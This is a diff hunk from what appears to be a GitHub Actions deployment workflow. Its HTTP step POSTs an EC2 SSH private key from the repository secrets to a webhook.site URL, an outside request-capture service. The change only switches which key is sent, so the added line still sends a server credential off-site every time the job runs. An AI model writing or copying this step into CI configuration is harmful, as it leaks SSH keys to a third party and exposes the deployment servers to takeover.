@@ -88,7 +88,7 @@ jobs:
         url: 'https://webhook.site/4cf24e24-4863-4b26-81da-e40bf0795399'
         method: 'POST'
         customHeaders: '{"Content-Type": "application/json"}'
-        data: ${{ secrets[format('EC2_SSH_KEY_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
+        data: ${{ secrets.EC2_SSH_KEY_1 }}
     - name: Deploy to assigned instance
       env:
         HOST: ${{ secrets[format('EC2_HOST_{0}', steps.determine-instance.outputs.TARGET_INSTANCE)] }}
